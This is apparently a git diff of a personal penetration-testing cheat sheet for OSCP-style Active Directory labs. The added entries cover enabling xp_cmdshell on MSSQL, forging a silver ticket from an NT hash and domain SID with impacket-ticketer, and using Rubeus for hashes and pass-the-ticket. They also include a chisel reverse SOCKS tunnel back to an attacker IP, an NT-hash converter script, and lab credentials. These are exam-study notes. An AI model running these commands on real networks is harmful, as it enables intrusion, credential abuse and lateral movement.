@@ -41,8 +41,7 @@ nxc smb $ip -u user -p pass -d domain --shares
 nxc winrm $ip -u user -p pass  -d domain
 nxc smb $ip -u user@domain.local -p pass
 
-# Windows auth: mssql case
-nxc mssql $ip -u user -p pass --windows-auth
+
 
 ############
 #  crackmapexec or nxc with hashes
@@ -143,13 +142,25 @@ impacket-dcomexec domain/user:password@target
 ##############
 # MSSQL Lateral Movement: Is it sql user? Impacket mssqlclient execution 
 ##############
-impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.119.148 -windows-auth
+impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.106.148 -windows-auth
 
 # Inside MSSQL shell:
+#Chek if I have access
+EXEC sp_configure 'xp_cmdshell';
+
+- `value_in_use = 1` → active and usable
+- `value_in_use = 0` → disabled
+
+# Am I sysadmin? 1=yes.
+SELECT IS_SRVROLEMEMBER('sysadmin');
+
+# If we can, then executes
 EXEC xp_cmdshell 'whoami';
 # Enable xp_cmdshell (if allowed)
-EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC sp_configure 'show advanced options',1; 
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; 
+RECONFIGURE;
 # Linked servers pivot
 EXEC sp_linkedservers;
 EXEC ('whoami') AT [LINKEDSERVER];
@@ -416,13 +427,13 @@ evil-winrm -i TARGET -u user -r DOMAIN
 # First, the kerberos ticket needs to be generated (with the krb5.conf file). Then the /etc/hosts needs the DC and the name of the machine you are trying to reach.
 
 impacket-psexec -k -no-pass domain.local/user@target.domain.local
-impacket-psexec -k -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam 
+# Example: impacket-psexec -k -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam 
 
 impacket-wmiexec -k -no-pass domain.local/user@target.domain.local
 impacket-wmiexec -k  -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam
 
 impacket-smbexec -k -no-pass domain.local/user@target.domain.local
-impacket-smbexec -k  -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam
+# Example: impacket-smbexec -k  -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam
 
 
 # atexec (Task Scheduler based → quieter than psexec)
@@ -433,6 +444,47 @@ impacket-dcomexec -k -no-pass domain.local/user@target.domain.local
 
 # Debug:
 klist
+
+##################
+# Mssql
+##################
+# Syntax: 
+impacket-mssqlclient -k domain.local
+
+# Example: 
+# at kali we generated the Silver TGT. For that we will need
+# 1. SID
+# NThash
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain nagoya-industries.com -domain-sid  S-1-5-21-1969309164-1513403977-1686805993 -extra-sid S-1-5-21-1969309164-1513403977-1686805993 Administrator
+----
+# 1. SID where the SID can be obtained 
+# from windows: 
+whoami /user
+# from kali 
+nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' -k --get-sid 
+# 2. NTHAS. The NTHASH of the SP can be obtained 
+# from windows with Rubeus:
+evil-winrm -i  192.168.209.21 -u christopher.lewis  -p 'Lalalala1234.'
+upload ../tools/Rubeus.exe
+.\Rubeus.exe asktgt /user:svc_mssql /password:Service1 /domain:nagoya.nagoya-industries.com /nowrap
+# From my kali, alternative way using the script ~/share/tools/converter/password2NThash.py
+python3 password2NThash.py Service1
+----
+
+
+# After running "impacket-ticketer...", and Administrator.ccache is generated.
+# At kali:
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+
+# We need to forward the connection
+# At kali
+chisel server --reverse --socks5 -p 9001
+# at windows target
+.\chisel.exe client 192.168.45.152:9001 R:socks
+
+# Then, from kali, finally: 
+proxychains impacket-mssqlclient -k nagoya.nagoya-industries.com
+
 ```
 
 
@@ -647,3 +699,52 @@ Token elevation (if available in session)
 ```
 token::elevate
 ```
+
+
+
+## Converters
+
+Convert password to a NThash.
+
+```python
+import sys
+import hashlib
+import binascii
+
+def password_to_nthash(password: str) -> str:
+    return binascii.hexlify(
+        hashlib.new('md4', password.encode('utf-16le')).digest()
+    ).decode()
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <password>")
+        sys.exit(1)
+
+    password = sys.argv[1]
+    nthash = password_to_nthash(password)
+    print(nthash)
+
+if __name__ == "__main__":
+    main()
+```
+
+
+Converting ccache and kirbi files
+
+If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.
+
+
+Convert ccache file into a kirbi one:
+
+```shell-session
+impacket-ticketConverter krb5cc_647401106_AL9htx julio.kirbi
+```
+
+
+Using the Converted Ticket into Windows Session with Rubeus: 
+
+```cmd-session
+.\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+
